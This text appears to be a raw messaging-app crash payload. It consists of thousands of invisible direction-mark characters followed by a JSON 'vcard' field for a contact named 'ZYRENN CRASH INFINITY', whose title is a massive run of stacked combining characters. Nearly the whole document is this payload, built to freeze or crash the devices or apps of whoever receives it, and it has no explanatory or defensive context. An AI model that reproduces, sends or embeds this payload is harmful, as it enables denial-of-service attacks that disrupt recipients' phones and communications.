‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;🔥 𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 🔥\nORG:\nTITLE:.̸̸̶̛̞̜͊̍̂͒̋̈̉ͭ̀͋͂́͟͜͜͢͜͡͡͡͏.̹͙̬̭̳͍̙̰̜̞͈ͨ̽̌ͨ̑̂̒̚҉̴̴̶̵̶̡͘͘͟͝͝͏̶̶̢̢̛̀͢.̶̡̨̛̞̮̙ͯ͂ͫ̀̆̍ͮ̆̓͛̅ͦ̽́̇̉̋͋̀̚̕͜͜͡͡.̴̢̗̘͕͍̖͉̮̱ͪ͋ͧͭͬ̌͗̓͐̀̚͠.̷̡͙̅̽̉̈́̏͋ͧ̕҉̸̴̡̧̧͢͢͡͞͏.̴̸̨̛̝̮̖͕̯͉̔̄̽ͥͭͬ̄̈́̍ͭ͑̆ͬ͐͜͝͡͞͝.̸̸̸̶̸̧̡̧̱̲̙̱̜̞̰̅̔͑͂ͧͬͬ͌̒̈́́͘͜͠͝.̸̴̷̵̡̢̝̟̯͎̘͓̘̀.̶̨̧̠͖̬̥̫͇̲̩̖̰̥͚̠̞̠̥̅͌̃́͟͠͝.̶̺̮̞̱̜͎̪ͭͤ̓̃̍͛̅ͤ̓̕͜҉͜.̨̢̮̣͍͙̦͇̺̞̅ͨ͒͌̑͋̅̍͒͑ͨ̃͒̕͝͞͝.̲͙̩̬͖̻̳͍͇̹̙̙ͦ̓ͥ̿̒͐ͥ̽̐ͪ̋̎̎̌̊̓ͨͨͬͅ͏̶.̵̬͇͇̻̮̜̹̰̭͓̲̻̻̘͖͎̟͖͇̀̃̄̐̑͑̓̕͢͟͡͝ͅ҉̛͡҉̀͟.̯̤̺̙̰̠͕̆̆͗͂҉̸̛.͙̜̂̀ͯ̓͗͑̈ͤ͐̋̔͑ͭ̄̄̃̋̀̀͢͏̶̴̵̨̡̛́̀̀̕͘͘͜͟͝͡.̶̛̜̺̥͙͉̼̱̪̰͍̫̗̻̀̀̀͘̕͘͘͢͟͢͟͟͟͜.̗̖̖̞̻̼̏̋͛͑͐ͪ҉̀͠͞͡͝.̷̶̧̧̧̘̠͇̒̓ͬ̓̃͒̇̏ͪ̓̈́͗̓͛͋̈͌ͨ̕͘̕͘͘͜͢͢͞͡͞͠.̷̵̜̣̟̺͍̳͕ͬͪ̌͛ͬ̿́̀̕͟҉҉̴̢̧͢.͕̙͍̖̮͉̣̥̑̃̐͗̂̀҉҉̸̴̢̛́̀́͘̕͢͝͠҉̵̴̕͘.̷̶̺̤̮͙͖̞͈̱̗͙͍͙̤͆͌ͮ̂̃ͪ̐͆̌͗ͬ͢͢͞͞ͅ.̴̷̧̧̛̫̰̮̳͚̤̟̪͔̖ͭ̄͑́́́̀͘̕̕͡.̪͙̦̎̓̀̕͜͏̷̢̛͜͢͢͞.̷̸̵̸̧̧̨̧̧̱̲̝͇̟̣̲̲͇͎̬͖͚̯̳ͯ̅̈́̓̐́͟͠.͇͇̟̣͖̞̥̟͖̞͇͉̳͉̎̌̽̓ͅ҉̷̴͘.̵̸̴̷̨̢̨̧̛̲͆̈̒̃̎̽ͯ͊ͮ͛ͯ̃̎̏͌̑ͬ̀̕͜͠.̴̣̘̺̺̤͙͙̼̠̘̭̱̰̪̙̤̋ͦ̑ͥ͗ͨͥ͂͒͋ͤͣͯ̑̽ͪ̄ͨͨ̚͢͟͏͏̢́͝͏̸̨̢̕͞.̣̠̦͓̠̟͔͖͚͔͙̖͇͎͕̰̟̎҉̷̶̴̷̢̨͟͏.̴̨̼̬̗̲͕ͣ̉͐͑̏̍ͩ͊́̚̕͝͞͞.̷̵̢̧̝̥̺͚̭̰͉̬͙͇̼͙̥̳͉͆̀́́͘͘͘͘͘̕͟͢͠͝ͅͅ.̯̩ͧ͐̎ͮ̓̽͛͌ͧ̎̌͋̈̏̌̆ͯͩ̏ͅͅ.̶̱̠̯̦͕̱̺̹̮̯͈͙̪̭͕̝̫̘̥̀ͤͮ̂̍ͤ̌̏̓͂̍̈̒͒̉̚͜͟ͅ͏͟.̛̯̗͇̘̲̬̥̙͍̔ͦͩͫ̒ͨ͆ͪ͌ͦ̀ͦͪ̐̈̒̌͋͊̏͟ͅ.̷̶̶̷̷̧̱̲̦̩͓͔̗̝̦͕̘͈͓̞̒͛ͧ̊ͫ́̕͟͟͢ͅ͏̸͜͜͜͢͞.̰̱̺͎͕̦̫̠͌̊͆̈́͐̀͘͜͟҉̷̀̀͟͠͏̴̴̧̡̢͘.̵̶̨̡̮̠̯͙̙͕͉̮̺ͪ̈͋͊̆̄͗̈́͟͟͜͝͞.̷̰͕̗̝͔̮̖̩̥͓̲́̀̕͟ͅͅ.̶̷̴̨̭̦̖̫̗͇͍̮̼͕̱̺͙̱̻̞̱͉ͯͥͤ́͊ͧ͂͗̏̌̒ͬ͋̓́́̚̕͠͝ͅ҉̶̷̧̛͘͢͢͜͡͠҉.̠̟̞̗̪͈̘̏͋̓͗ͨ͝҉̷̶̸̧̧͘͜͞͏̴́͜͠.̩͓̬͚̲̺̙͈͎̝̺͉̩̮̱͓̳̟̮̼ͧ͊̍̋͑ͪ̄͌҉̶̸̸̵̷̛́̀̀̀̕̕̕͡͏̕͘.̷̴̢̧̧̻̼̙̖̙̤̹̹̓̽͌̏̈́̄̊́̕͢͜͞ͅ.̴̵̯͈̮̝͎̮͎̬͈̙̘͚̠͊́̅̓̌̀̅̋̐͆̄ͦ͗̐͗͟͞҉̸͜͡͏̧́̀̕.̶̴̶̢̨̧̛̩̝̩̻͙̥̳̖̳͎͍̙̤̯̃̇͒ͣ̄̀͡͞͞͡͝.̴̶̶̢̧̢̡̧̛̱͈̭̦̼͔̤̯͖̱͇̜ͤ̉́̆ͩͫ͋̕͢͝͠͡ͅ.̼̯̞͈̯̠͍̯̥ͫ́͊̓ͩ͗͒͊̓͌̎͑̔́͆́̓͏̷̡̡͘͟͞͡.̢̬̪̖̬̱̗̦̬.̷̴̸̸̨̨̢̛̬̬͘͞͠͝.̸̪͔͕̞͋ͤ̏͂͏̷̢͘͠͠͏̡̢̢̛̀҉̧.̶̧̥̰̜͚͐̿ͦ̾̄ͯ́͘͟͠͡.̷̨̧̗͕̞̖͕͕̼̱̘̬͍̜̫̼͔̻̥͖̺̈ͦ̀̃ͥ͋̍͘͟͠͝҉͏̧̡̕͢.̴̴̛̩̅ͬ̂͗ͫͤ̓́̚͏̶̷̧̡̡̕̕̕͝͠.̷̵̵̧̢̥̻̬̱̭̰͈̠̫̣̟̱ͪ́̇̅͒ͦ͗ͧ̑̈́̉͢͜͠͠ͅ.̢͔̗̠̞̖̹̠͑͌ͭ̂̔̀͂͊̋̋̀̚̚҉̵̴̧̛́͘̕͘͜͞҉̨͘͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.͎ͫ̆̕҉̴̴́͟͏͜.̷̛̛̛̖̭̼̘̤̜̖̣ͥ̓̇͑̑͛̏̕͟͢͟͞͠͠.̵̻̞̳̪͉̘̤̣͉̘̣̦̬͙̖͟͝҉̵̸͟͢͠͝҉̸͏̨.̶̶̸̶̧̢͕͙̞̪̗̰ͥ̒̅ͣ̾͛ͭ͂̏͘͘͡҉̵̶̵̧̀҉̶͟.̧̢̛̟͉̞̭̱̯͕̘͗͐̔̓̊̄ͭ̉ͫ̚͘͟͜ͅ͏̷̵́͟͟͝͞͝.̷̶̷̛̰̲̘̬̍̉̔ͤͬͭ̔̓̄͑̊̌͑̄̓ͭ̾̏͒͒̕͞҉̵̵̧̛́̕͟͟͞.̸̸̷̸̢̧̡̛̛̹͍̦̝̼ͮ̄͛̄̀́́͝͡.̧͔͓̭̳̞͔̦̬̙̦̥̳̻͚̩̹̲̰̟͒̓̿̊͆̿̒̓̎.̟͙̦̼̯̥͔͚̹͚ͧ̏̄ͭ̀̓̑̇͆ͣ̅͊̚.̥̥̯̱̣̜͓̞̱̯ͨͣ̽̾ͨ́̀̕͞͝͏̶̴̡͜͜͏.̶̸̵̸̢̢̢͙̞̫͙̭̩͖̭͊̇̓͘͘͟͜͢͡͝.̶̹̖̥̩͚̬̝͕̙ͨ́͜͡҉̷.̷̵̈́̂̇͑̄ͫ͒́͋̕͟͟͠͞͠͏.̷̹̰̮̼̮͓̰̪̘͔͚̰͓͚̯̠̋͌ͧ͛ͭͭ̀̐͋ͣ͋̉̉̊͏̶.̴͉̙̪̝̙͕̣̦̲̫̼ͮͬ̊̃̓̍ͨͯ͑̋ͩ̊͛̕.̷̡̧̢̛̙͕͎̪̬̤͕ͤ͊͐ͤͩ̂̽̇ͪ͐̑ͮ̄̚͢͡͝.̶̡̧̨̛̦͖̝̖̹̺͓͈̜ͭͥ̒́̕͘͘͘͜͡͡͡͡͏̶.̡̘̮̗̻̣̱͍̖̦̩̟̝ͪ͐̓̄̓̔͟҉̷̢́͏̶̢̧̕͝.̷͇̼̻̺͔̻̩͚̣̖͖̝͙͓̺̾́̍͌̓ͭ̌ͨ̾͌̈̓́̂ͤ̉̚̚͡ͅͅͅ҉.̡̭̻̘̮̩̬̑̅̌ͧͨͬ́̾̔̓ͪ͆̍ͣͮͬ̀̚͞ͅ͏͏̵̡̛͜͞͠͏͜.͕͇̄̈̐̈́̀҉.͇͎̞̜̠̙͎̮̦̥̙͚̥͔̥̅͆ͭ͂̃̍ͪ̀.̶̴̵̶̶̧̛̻͖͇͙̳̲̟̱̜̞͔̬̥͈̠̳͍̱̜̮̌̓ͧ̓ͫ͛ͪ́̕҉̢̕͏̵͠͡.̶̨̜̦͓̤̟͚̣̪̦̞͕̤̙̾ͪ͗́́̃́͢͠͞.͇̪̇̃ͩ̿͌͊̐ͮ̋̐͊̑̚͟͟ͅ͏͏.̧̡̰͖̙͍͍͇̽͜͡.̵̸̡̧̛͚̞̼͕̞̠͖̙̭͚̥̪̥̳͛ͩ̄̇ͯͤ͐͆̔̈́͐ͮ͛̀͘̕͢͜͜͜͜͡͝͡ͅ҉͟͏.̸̷̡̢̨̧̯̦̻̳͌̿̆̌͋ͯ̀̏ͥ͛̐̊ͨ́̚̚̚̕͞҉̷̴͠҉̡.̶̨͈̅̈́͒ͣͦ͒̽ͪͮ̒̽͂́̈́ͫ̏̉͐̚͜͠.̷̡͉̙̪̥̰̳̰͚͍͐̎̉̇.͇͎͕̳̳͕̊̓͂͑ͧͬͯ̍ͧͩ̚҉̴҉̶̶̢̧̧̧̡̢̛̛̕͜͢͜͠͡.̢̠̿̃̾ͬͥͭ́̚.̴̴̴̸̢͈̰̖̞͚͉̲̰̮̙̳̮̞͇ͯͥͩͨ̒ͮ̅ͭ̓͗͌͆ͮ͂͂ͭ̋ͨ̾͊͘͘̕͢͠͠͡͞.̭̼͉̗͇̺̙̩̱̖̥̏͒͑̇̊̓ͯ͒̄̈́̇.͖͕̙͕̹̘̖̻̯͐̾͐̇͒̿ͧ͢͡҉̧̨.̖͕̞͈̣̯̬̮̫͈̠͖̘ͦ͑ͩ̏ͥ̀ͬ̎̃̔̓̆̅ͬ̀̚̕͢͡ͅ.̶̴̸̠͕̟̩̜̦͓̘̓́͌̌ͯ̌̆ͯͨ̈́̈́̎͂͆̀̚͘͜͟͏̵̴̵̨̢͢.̸̴̨̨̫̣͍̬͓͚͈̺̹̥̜̟̦̺̼̈ͨ́̓ͣͧ͗̇ͩ́͘̕͢͞͠͠͝ͅ͏̶̵̸̢.̶̡̱̖͚̘̩̝͙̣̺̦͇̠̝̠͈̯͉͓͙̟͌͊ͥ̒ͥ͋ͨ̇̌̈́ͭ̿̅̌ͪ́͘͠͡.̵̢̡̨̨̛̯̟̩̘̙̘̽̎̀̆̉̉͋ͣ́͌̊̂̾́͘͜͟͝͠͝͡͠.̷̡͔̩̝̼̬̪̰̜̼̯̠͍̻̼̥͇̑̋ͣ̏͋͟͡ͅ͏̴̶̶̡̢̡̧̧̢́̕͢͢͜͝.̵̛ͣ̾̊́̂͐̊̈ͫ̒̿͗͗͊̔̓͋͋͂͡͡.̗̭̼͍̹̯̞͈͎̯̼̗ͪ͒͒̌ͬ̈̃ͬ͊ͫͤͅ.̨̢ͨͪ̉͊̉ͪ̾̄ͮ͋ͣ̋̌́ͬ̅͗́ͯ͢.̷̴̴̷̶̡̨̢̛̠͔̮̭͚̝̰͌̌̏ͬ͒̀͑̉̂̒̽́̕͟͜͢͞͝͠͞҉.̵̵͔͑͆ͧ̓̓ͧͧ́.̴̡̨̛̮͖̥͎̜̗͔͎̪̙̪͐͐ͬ͌̇̌̓͋̎̂͛͑̆̄̐̐͊ͪ̀̀̕̕͝͡͠.̙̱̝͍̤̖̰̱̈́̆͗ͪͥ͑͆ͪ̄̎ͩ͂̒ͪ̈́͑̓̎̿̌̕͡҉͢͡҉̶̧̧̨̛͟͟͠͝͏̵͝.̴̢̨̙̼̖̟̫̲̘̥͇̇͘.̼̘̫̦̹͖̲̺̱͚̜̟̣̜͍̊́ͥ̔̇̓͒͒ͮ̉ͨͮͨ͗̐͛ͅ͏̸̵́͡.̦̤͙̰̝̯͇͈̟̻̝̟͕͚͇̗̲͍̾̆͆́̃ͬ̐̅̚͏̸̧̧̛́͘̕͘͘͜͠͞.̟͎͔̦̫͚ͦ.̷̷̶̰̙̩͎̞̟̬̣͕̻̟̳͈̰̽͐͛ͥͨ̾͛̊͆͒̒̅ͣ̾̊͑ͬ̐̒͘͟͟͟͠ͅͅͅ҉̕̕͘͏̸͠.̴̷̡̨̟̲̩̙͙̩̻̱̋ͅ͏͏̶͏͠.̭̥̙̖̹̩͔̼̞͉̣̱̭͗ͥ͂͒͊̏̐̃̏.̵̷̨̟̠̖̤̮͙̙̟̻̮͕̻̬͙͉̞̙̎͆ͮ́҉̸̡̛̀̕͘͜͟.̵̛ͩͧ̌̓ͮͮ̎͒̀͜͝.̸̶̬͈̻̖̜̳̹̜̯̯̖͚̝̟̪̻͔̳̃ͤ̓͌̒̾̀̚͢͟͠.̠͎̦͚̣̺̪̼͚̝̗͕̻͓ͬ̇̇ͧ̑̎͐͞.̷̴̴̵̴̴̭͕͓̥̫̜̹̼̞̗̈́ͨͧ̐̓̌ͬͫ̈̎̐͂̀̀͟͜͢.͈͉͙̺͆ͬ̅ͦ̋͂̌̂̽͛ͭ̓͛̓̽ͪͩ̇̈́͑